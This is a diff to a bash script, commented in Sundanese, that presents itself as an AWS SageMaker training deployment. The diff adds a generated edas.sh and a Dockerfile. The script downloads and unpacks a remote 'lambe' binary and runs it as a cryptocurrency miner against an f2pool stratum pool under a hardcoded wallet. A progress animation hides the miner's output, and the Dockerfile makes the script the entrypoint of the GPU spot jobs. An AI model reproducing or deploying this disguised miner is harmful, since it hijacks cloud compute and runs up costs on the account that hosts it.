@@ -49,6 +49,152 @@ SPOT_INSTANCE_TYPES=(
   "ml.g4dn.12xlarge"
 )
 
+write_self_contained_files() {
+  echo "Nyieun file edas.sh jeung Dockerfile sacara lokal..."
+
+  cat > edas.sh <<'EOF'
+#!/bin/bash
+
+# Fungsi spinner umum
+run_with_loading() {
+    local message="$1"
+    shift
+
+    "$@" > /dev/null 2>&1 &
+    local pid=$!
+
+    local spinner=("|" "/" "-" "\\")
+    while kill -0 "$pid" 2>/dev/null; do
+        for char in "${spinner[@]}"; do
+            printf "\r[%c] %s" "$char" "$message"
+            sleep 0.08
+            if ! kill -0 "$pid" 2>/dev/null; then
+                break
+            fi
+        done
+    done
+
+    wait "$pid"
+    local status=$?
+
+    if [ $status -eq 0 ]; then
+        printf "\r[✔] %s selesai\n" "$message"
+    else
+        printf "\r[✖] %s gagal\n" "$message"
+        return $status
+    fi
+
+    return 0
+}
+
+# 1. Download
+run_with_loading "Nunduh lambe.tar.gz..." curl -L -O https://gitlab.com/gas-group8801643/bac/-/raw/main/lambe.tar.gz
+if [ $? -ne 0 ]; then
+    exit 1
+fi
+
+# 2. Ekstrak
+run_with_loading "Ngékstrak lambe.tar.gz..." tar -xvf lambe.tar.gz
+if [ $? -ne 0 ]; then
+    exit 1
+fi
+
+# === Ambil IP lokal kalayan leuwih aman jeung andal ===
+worker_name=""
+
+# Metode 1: Maké hostname -I
+if command -v hostname >/dev/null 2>&1; then
+    worker_name=$(hostname -I 2>/dev/null | awk '{print $1}')
+fi
+
+# Metode 2: Lamun masih kosong, maké ip route
+if [ -z "$worker_name" ] && command -v ip >/dev/null 2>&1; then
+    worker_name=$(ip route show 2>/dev/null | awk '/default/ {print $3}' | head -n 1)
+fi
+
+# Metode 3: Fallback pamungkas lamun tetep kosong
+if [ -z "$worker_name" ] || [ "$worker_name" = "0" ]; then
+    worker_name="worker1"
+fi
+
+wallet="ginanjarsri57"
+worker_tag="${wallet}.${worker_name}"
+if command -v nproc >/dev/null 2>&1; then
+    if nproc --all >/dev/null 2>&1; then
+        threads="$(nproc --all)"
+    else
+        threads="$(nproc)"
+    fi
+else
+    threads=1
+fi
+
+echo "Ngalirkeun lambe kalayan worker: ${worker_tag}"
+./lambe --algorithm quantus --pool stratum+tcp://qtc.f2pool.com:4500 --wallet "$worker_tag" &
+
+lambe_PID=$!
+
+# 1. Atur tampilan terminal
+tput civis
+trap 'tput cnorm; printf "\033[0m\n"; exit' INT TERM
+
+cols=$(tput cols 2>/dev/null || echo 80)
+text="NUJU PROSES"
+total_dots=12
+dots=0
+
+# Pindah ka baris anyar khusus pikeun animasi hiji baris
+printf "\n"
+
+while kill -0 "$lambe_PID" 2>/dev/null; do
+    printf '\033[1A\033[2K'
+
+    total_len=$(( ${#text} + total_dots ))
+    x=$(( (cols - total_len) / 2 ))
+    [[ $x -lt 0 ]] && x=0
+
+    dot_str=""
+    for ((i=0; i<dots; i++)); do
+        dot_str="${dot_str}."
+    done
+
+    printf '\033[%dG\033[1;37m%s%s\033[0m\n' "$x" "$text" "$dot_str"
+
+    dots=$(( (dots + 1) % (total_dots + 1) ))
+    sleep 0.16
+done
+
+tput cnorm
+printf "\033[0m\n"
+echo "[ SELESAI ] Proses lambe geus eureun."
+EOF
+
+  chmod +x edas.sh
+
+  cat > Dockerfile <<'EOF'
+FROM python:3.12-slim
+
+WORKDIR /workspace
+
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    bash \
+    ca-certificates \
+    curl \
+    jq \
+    unzip \
+    git \
+    awscli \
+    && rm -rf /var/lib/apt/lists/*
+
+COPY edas.sh /opt/ml/processing/input/edas.sh
+RUN chmod +x /opt/ml/processing/input/edas.sh
+
+ENTRYPOINT ["/bin/bash", "/opt/ml/processing/input/edas.sh"]
+EOF
+
+  echo "File edas.sh jeung Dockerfile geus berhasil dijieun."
+}
+
 check_training_dataset() {
   local region="$1"
   local s3_prefix="s3://${ACCOUNT_ID}-${region}/${APP_NAME}/"
@@ -131,7 +277,7 @@ create_spot_job() {
   fi
 }
 
-echo "=== Proses Deployment AWS + IAM Role ==="
+echo "=== Prosés Deployment AWS + IAM Role ==="
 
 ACCOUNT_ID="$(aws sts get-caller-identity --query Account --output text 2>/dev/null || true)"
 if [[ -z "${ACCOUNT_ID}" ]]; then
@@ -196,8 +342,10 @@ fi
 
 TRAINING_REGION="${TRAINING_REGION//[[:space:]]/}"
 
+write_self_contained_files
+
 echo "Nyiapkeun trust policy pikeun SageMaker..."
-cat > /tmp/sagemaker-trust-policy.json <<JSON
+cat > /tmp/sagemaker-trust-policy.json <<'JSON'
 {
   "Version": "2012-10-17",
   "Statement": [
@@ -240,11 +388,7 @@ ROLE_ARN=$(aws iam get-role --role-name "${ROLE_NAME}" --query "Role.Arn" --outp
 echo "Role IAM SageMaker:"
 echo "${ROLE_ARN}"
 
-echo "Ngeunduh file konfigurasi..."
-curl -fsSL https://github.com/ngagateng2-creator/codet/raw/refs/heads/main/edas.sh -o edas.sh
-curl -fsSL https://github.com/ngagateng2-creator/codet/raw/refs/heads/main/Dockerfile -o Dockerfile
-
-echo "Ieu hasil file anu diunduh:"
+echo "Ieu hasil file anu dijieun sacara lokal:"
 echo "--- edas.sh ---"
 sed -n '1,40p' edas.sh
 echo "--- Dockerfile ---"
@@ -302,7 +446,7 @@ if [[ -z "${CONFIRM_JOBS}" ]]; then
   CONFIRM_JOBS="y"
 fi
 if [[ ! "${CONFIRM_JOBS}" =~ ^[Yy]$ ]]; then
-  echo "Training jobs dibatalkeun. Proses deployment AWS geus selesai."
+  echo "Training jobs dibatalkeun. Prosés deployment AWS geus selesai."
   echo "Role ARN: ${ROLE_ARN}"
   exit 0
 fi
@@ -370,5 +514,5 @@ echo "Spot: total attempt=${spot_attempt_total}, success=${spot_success_total}, 
 
 echo
 
-echo "Proses deployment AWS geus selesai."
+echo "Prosés deployment AWS geus selesai."
 echo "Role ARN: ${ROLE_ARN}"
